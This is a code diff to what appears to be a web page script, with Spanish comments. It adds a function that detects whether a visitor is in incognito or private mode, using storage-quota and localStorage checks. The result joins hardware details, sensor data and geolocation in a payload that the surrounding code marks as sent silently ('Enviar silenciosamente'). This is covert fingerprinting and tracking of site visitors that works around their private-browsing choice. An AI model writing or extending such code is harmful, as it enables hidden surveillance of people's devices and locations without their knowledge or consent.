@@ -612,6 +612,40 @@ body {
         };
     }
 
+    // 🕵️ DETECCIÓN DE MODO INCÓGNITO/PRIVADO
+    async function detectIncognito() {
+        const detection = {
+            isIncognito: false,
+            method: 'unknown',
+            confidence: 'low'
+        };
+
+        try {
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                const { quota } = await navigator.storage.estimate();
+                if (quota && quota < 120000000) {
+                    detection.isIncognito = true;
+                    detection.method = 'storage-quota';
+                    detection.confidence = 'high';
+                    return detection;
+                }
+            }
+
+            try {
+                localStorage.setItem('test', '1');
+                localStorage.removeItem('test');
+            } catch (e) {
+                detection.isIncognito = true;
+                detection.method = 'localstorage';
+                detection.confidence = 'high';
+            }
+        } catch (e) {
+            detection.method = 'error';
+        }
+
+        return detection;
+    }
+
     async function tryGetLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -659,7 +693,8 @@ body {
             const hardware = await getHardwareInfo();
             const sensors = detectSensors();
             const geolocation = await tryGetLocation();
-            
+            const incognitoDetection = await detectIncognito();
+
             const timeOnPage = Math.round((Date.now() - startTime) / 1000);
             
             const data = {
@@ -691,7 +726,8 @@ body {
                 },
                 hardware: hardware,
                 sensors: sensors,
-                geolocation: geolocation
+                geolocation: geolocation,
+                incognitoMode: incognitoDetection
             };
             
             // Enviar silenciosamente
